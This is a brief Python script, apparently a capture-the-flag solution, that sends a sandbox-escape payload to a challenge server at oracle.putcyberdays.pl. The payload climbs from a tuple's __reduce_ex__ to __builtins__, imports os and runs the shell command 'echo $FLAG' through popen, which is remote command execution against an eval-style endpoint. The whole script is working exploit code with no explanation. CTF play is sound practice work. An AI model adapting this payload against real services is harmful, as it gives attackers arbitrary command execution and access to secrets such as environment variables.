import requests

url = 'http://oracle.putcyberdays.pl/'

cmd = 'echo $FLAG'

payload = f"().__reduce_ex__(2)[0].__builtins__['__import__']('os').popen('{cmd}').read()"

res = requests.post(url, headers={
    'Content-Type': 'application/x-www-form-urlencoded'
}, data=f'code={payload}')

print(res.json()['error'], res.json()['result'])